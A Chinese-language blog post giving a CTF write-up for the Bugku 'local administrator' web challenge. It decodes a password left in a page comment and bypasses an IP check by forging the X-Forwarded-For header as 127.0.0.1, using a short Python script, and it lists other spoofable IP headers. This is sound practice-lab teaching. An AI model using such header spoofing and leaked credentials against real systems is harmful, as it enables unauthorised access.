---
layout: post
title: Bugku CTF｜本地管理员
date: 2026-09-15
categories: CTF, Web
tags: XFF头伪造, HTTP请求头, 源码审计, POST传参
---

# 题目：Bugku CTF 本地管理员

## 题目描述
打开靶场页面出现登录界面，尝试直接登录会提示IP非法，不是本机地址，无法登录。需要找到账号密码，并且绕过IP校验拿到flag。

## 解题思路
1. 按下`Ctrl+U`查看网页源代码，在页面注释中发现一段Base64编码字符串：`dGVzdDEyMw==`
2. 对Base64解码得到密码 `test123`，尝试账号为`admin`
3. 直接提交登录数据包，页面提示IP不允许访问，判断考点为 **X‑Forwarded‑For（XFF）IP伪造**，需要添加请求头把来源IP伪造成本地回环地址`127.0.0.1`
4. F12查看input输入框，表单name属性为`user`和`pass`，确定POST参数名称
5. 使用Python构造带XFF请求头的POST包提交，成功拿到flag

## Python解题脚本
```python```
# 导入requests库，用于构造发送HTTP数据包
import requests
# 靶场链接，重启环境后需要更新IP和端口
url = "http://xxx.xxx.xxx.xxx:xxxx"
# POST表单参数，从前端input标签name获取，不是页面上看到的文字
post_data = {
    "user": "admin",
    "pass": "test123"
}
# 添加XFF请求头，伪造客户端IP为127.0.0.1本地地址
headers = {
    "X-Forwarded-For": "127.0.0.1"
}
# 发送POST登录请求
resp = requests.post(url, data=post_data, headers=headers)
# 打印页面返回内容，输出flag
print(resp.text)

## 踩坑记录
1. 最开始想当然填写POST参数为 Username 、 Password ，和页面文字保持一致，一直提交失败、页面返回空白。必须以input标签的name属性为准。
2. PyCharm运行配置异常，一直执行旧文件报PHP语法错误，后面改用单独新建py文件、右键运行才解决。
3. Bugku靶场有存活时间，超时之后IP失效，脚本运行无返回内容，需要重新启动靶场并修改url。
 
## 知识点总结
1. X‑Forwarded‑For简称XFF，属于HTTP扩展请求头，后端如果直接信任XFF的值，就可以手动构造实现客户端IP伪造，是CTF中非常经典的考点。
2. Web题第一步优先查看网页源代码，注释里面经常存放密码、Base64密文、hint提示。
3. POST传参名称不能靠肉眼看页面文字猜测，一定要通过F12开发者工具或者前端源码确认input标签的name。
4. 遇到IP拦截类题目，优先尝试： X‑Forwarded‑For 、 X‑Real‑IP 、 Client‑IP 这类IP相关请求头。

